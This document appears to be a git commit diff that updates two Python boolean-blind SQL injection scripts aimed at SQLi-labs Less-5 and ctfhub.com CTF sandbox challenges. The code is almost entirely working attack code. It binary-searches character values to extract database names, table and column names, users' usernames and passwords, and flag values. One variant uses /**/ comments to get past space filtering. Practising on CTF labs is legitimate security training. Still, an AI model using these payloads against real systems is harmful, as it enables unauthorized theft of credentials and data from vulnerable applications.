cf1b356407144848899f7cd4bcd0a039fc50b7e7
jm2166 <jm2166@vip.sina.com>
2024-04-12 13:42:22 +0800

    修改了blind2.py

--- blind.py
+++ blind.py
@@ -2,20 +2,20 @@
 #本脚本以SQLi-labs Less-5为例
 import requests
 
-url = "http://192.168.80.50/sqli/Less-5/index.php"
+url = "http://challenge-02bd99af672b788d.sandbox.ctfhub.com:10800/"
 result = ''
 
 for i in range(1,200):
     l,r = 32,128
     while l < (r-1):
         m = (l+r) // 2
-    #    payload = f"1' and (ascii(substr(database(),{i},1)) = {j}) #" #爆破数据库名
-    #    payload = f"1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),{i},1)) = {j}) #" #爆破表名
-    #    payload = f"1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='数据表名'),{i},1)) = {j}) #" #爆破字段名
-    #    payload = f"1' and (ascii(substr((select group_concat(concat(username,' ',password)) from security.users),{i},1)) < {m}) #"  #爆破字段里的数据
+        payload = f"1 and if((ascii(substr(database(),{i},1)) = {m}),1,0) #" #爆破数据库名
+    #    payload = f"1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),{i},1)) = {j}) #" #爆破表名
+    #    payload = f"1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='数据表名'),{i},1)) = {j}) #" #爆破字段名
+    #    payload = f"1 and (ascii(substr((select group_concat(concat(username,' ',password)) from security.users),{i},1)) < {m}) #"  #爆破字段里的数据
         params = {"id":payload}
         res = requests.get(url,params=params)
-        if "You are in" in res.text:
+        if "query_success" in res.text:
             r = m
         else:
             l = m
--- blind2.py
+++ blind2.py
@@ -2,21 +2,21 @@
 #布尔盲注脚本,考虑过滤空格的情况
 import requests
 
-url = ""
+url = "http://challenge-8fb978152c60403b.sandbox.ctfhub.com:10800/"
 result = ''
 
 for i in range(1,50):
     l,r = 32,128
     while l < (r-1):
         m = (l+r) // 2
-    #    payload = f"if((ascii(substr(database(),{i},1)))<{m},1,2)" #爆破数据库名
-    #    payload = f"if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{i},1)))<{m},1,2)" #爆破表名
-    #    payload = f"if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))<{m}),1,2)" #爆破字段名
-   #     payload = f"if((ascii(substr((select(concat(flag,':',value))from(flag)),{i},1)))<{m},1,2)" #爆破字段里的数据
+    #    payload = f"if((ascii(substr(database(),{i},1)))<{m},1,3)" #爆破数据库名
+   #     payload = f"if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'),{i},1)))<{m},1,3)" #爆破表名
+   #     payload = f"if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))<{m}),1,3)" #爆破字段名
+        payload = f"if((ascii(substr((select(concat(flag))from(flag)),{i},1)))<{m},1,3)" #爆破字段里的数据
 
-        data = {"stunum":payload}
+        data = {"id":payload}
         res = requests.get(url,params=data)
-        if "Hi admin" in res.text:
+        if "query_success" in res.text:
             r = m
         else:
             l = m
